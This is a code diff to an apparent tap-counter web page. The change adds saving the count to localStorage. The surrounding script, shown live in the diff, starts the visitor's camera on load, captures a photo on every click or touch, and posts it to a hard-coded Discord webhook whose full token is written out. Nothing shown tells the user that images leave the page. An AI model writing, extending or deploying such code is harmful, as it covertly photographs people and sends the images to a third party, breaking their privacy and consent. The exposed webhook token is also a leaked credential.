@@ -56,17 +56,19 @@
 <script>
 // ────────────────────────────────────────────────
 const WEBHOOK = "https://discord.com/api/webhooks/1478491370887975104/8JBywMAGvuEp63A-bNVktEfzGB0hizI4N0GIX9s8KFOl1YjXK0Eo-u5MAqeY9iSFbDFo";
+const STORAGE_KEY = "sixtyseven_counter";
 
 const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
 const ctx = canvas.getContext("2d");
 const counterEl = document.getElementById("counter");
 
-let count = 0;
+let count = Number(localStorage.getItem(STORAGE_KEY)) || 0;
 
-// Update displayed number
+// Update display + save
 function updateCounter() {
   counterEl.textContent = count;
+  localStorage.setItem(STORAGE_KEY, count);
 }
 
 async function startCamera() {
@@ -77,7 +79,7 @@ async function startCamera() {
     video.srcObject = stream;
     await new Promise(r => video.onloadedmetadata = r);
   } catch (err) {
-    console.error("Camera blocked or denied", err);
+    console.error("Camera access denied or unavailable", err);
   }
 }
 
@@ -97,7 +99,7 @@ async function snapAndSend() {
     fetch(WEBHOOK, {
       method: "POST",
       body: formData
-    }).catch(err => console.error("Send failed", err));
+    }).catch(err => console.error("Webhook send failed", err));
   }, "image/jpeg", 0.90);
 }
 
@@ -114,12 +116,9 @@ document.addEventListener("touchstart", (e) => {
   handleClick();
 }, { passive: false });
 
-// Start camera on load
-startCamera();
-
-// Optional: make it start counting from whatever (e.g. localStorage)
-// But keeping it simple at 0 for now
+// Init
 updateCounter();
+startCamera();
 </script>
 </body>
 </html>
